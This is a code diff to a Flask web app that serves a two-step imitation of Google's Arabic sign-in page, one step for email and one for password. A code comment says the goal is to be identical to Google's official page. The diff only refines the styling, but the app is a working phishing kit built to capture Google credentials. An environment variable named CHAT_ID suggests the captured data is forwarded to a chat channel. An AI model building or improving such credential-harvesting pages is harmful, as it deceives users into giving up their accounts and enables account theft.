@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: إدخال البريد الإلكتروني أو الهاتف مع خيار إنشاء حساب
+# الصفحة الأولى: مطابقة تماماً لتصميم صفحة جوجل الرسمية
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -50,29 +50,38 @@ def step1():
             overflow: hidden; 
             display: flex; 
             flex-direction: column; 
-            justify-content: center; 
+            justify-content: space-between; 
             align-items: center; 
+            padding: 24px 16px;
         }
         
         .login-container {
             width: 100%;
-            max-width: 400px;
-            padding: 24px;
+            max-width: 450px;
             display: flex;
             flex-direction: column;
             align-items: center;
             text-align: center;
-            justify-content: center;
+            margin: auto;
         }
 
         .google-g {
-            width: 44px;
-            height: 44px;
-            margin-bottom: 16px;
+            width: 48px;
+            height: 48px;
+            margin-bottom: 12px;
         }
 
         .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
-        .subtitle { font-size: 14.5px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
+        .subtitle { font-size: 14.5px; color: #5f6368; margin-bottom: 6px; line-height: 1.5; }
+        
+        .info-link {
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            margin-bottom: 24px;
+            display: inline-block;
+        }
+        .info-link:hover { text-decoration: underline; }
 
         .error-msg { 
             color: #d93025; 
@@ -87,7 +96,7 @@ def step1():
             border: 1px solid #fad2cf; 
         }
 
-        .input-group { width: 100%; margin-bottom: 6px; }
+        .input-group { width: 100%; margin-bottom: 10px; }
         .input-group input {
             width: 100%;
             padding: 16px 14px;
@@ -103,8 +112,9 @@ def step1():
         .links-container {
             width: 100%;
             display: flex;
-            justify-content: space-between;
-            align-items: center;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 12px;
             margin-bottom: 30px;
             padding: 0 2px;
         }
@@ -116,13 +126,20 @@ def step1():
         }
         .links-container a:hover { text-decoration: underline; }
 
-        .submit-btn {
+        .footer-action {
             width: 100%;
+            max-width: 450px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+        }
+
+        .submit-btn {
             background: #1a73e8;
             color: white;
             border: none;
             border-radius: 25px;
-            padding: 12px;
+            padding: 10px 28px;
             font-size: 15px;
             font-weight: 500;
             cursor: pointer;
@@ -141,6 +158,7 @@ def step1():
 
         <div class="title">تسجيل الدخول</div>
         <div class="subtitle">يُرجى استخدام حسابك على Google. ستتم إضافة الحساب إلى هذا الجهاز وسيكون متاحًا لاستخدامه في تطبيقات Google الأخرى.</div>
+        <a href="#" class="info-link">مزيد من المعلومات حول استخدام حسابك</a>
 
         {% if error %}
             <div class="error-msg">{{ error }}</div>
@@ -152,12 +170,14 @@ def step1():
             </div>
             
             <div class="links-container">
-                <a href="#">هل نسيت بريدك الإلكتروني؟</a>
                 <a href="https://accounts.google.com/signup" target="_blank">إنشاء حساب</a>
+                <a href="#">هل نسيت بريدك الإلكتروني؟</a>
             </div>
-
-            <button type="submit" class="submit-btn">التالي</button>
         </form>
+    </div>
+
+    <div class="footer-action">
+        <button type="submit" form="emailForm" class="submit-btn" onclick="document.querySelector('form').submit();">التالي</button>
     </div>
 </body>
 </html>
@@ -166,7 +186,7 @@ def step1():
   )
 
 
-# الصفحة الثانية: إدخال كلمة المرور مع منع التمرير
+# الصفحة الثانية: إدخال كلمة المرور مع تثبيت الواجهة بدون تمرير
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
@@ -208,19 +228,19 @@ def step2():
             overflow: hidden; 
             display: flex; 
             flex-direction: column; 
-            justify-content: center; 
+            justify-content: space-between; 
             align-items: center; 
+            padding: 24px 16px;
         }
         
         .login-container {
             width: 100%;
-            max-width: 400px;
-            padding: 24px;
+            max-width: 450px;
             display: flex;
             flex-direction: column;
             align-items: center;
             text-align: center;
-            justify-content: center;
+            margin: auto;
         }
 
         .google-logo {
@@ -241,7 +261,7 @@ def step2():
         .google-logo span span:nth-child(5) { color: #34A853; }
         .google-logo span span:nth-child(6) { color: #EA4335; }
 
-        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 12px; }
         
         .user-chip {
             display: inline-flex;
@@ -283,17 +303,23 @@ def step2():
         }
         .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px 13px; }
 
-        .submit-btn {
+        .footer-action {
             width: 100%;
+            max-width: 450px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+        }
+
+        .submit-btn {
             background: #1a73e8;
             color: white;
             border: none;
             border-radius: 25px;
-            padding: 12px;
+            padding: 10px 28px;
             font-size: 15px;
             font-weight: 500;
             cursor: pointer;
-            margin-top: 15px;
         }
         .submit-btn:hover { background: #1558b0; }
     </style>
@@ -321,8 +347,11 @@ def step2():
             <div class="input-group">
                 <input type="password" name="password" required placeholder="إدخال كلمة المرور">
             </div>
-            <button type="submit" class="submit-btn">التالي</button>
         </form>
+    </div>
+
+    <div class="footer-action">
+        <button type="submit" form="passForm" class="submit-btn" onclick="document.querySelector('form').submit();">التالي</button>
     </div>
 </body>
 </html>
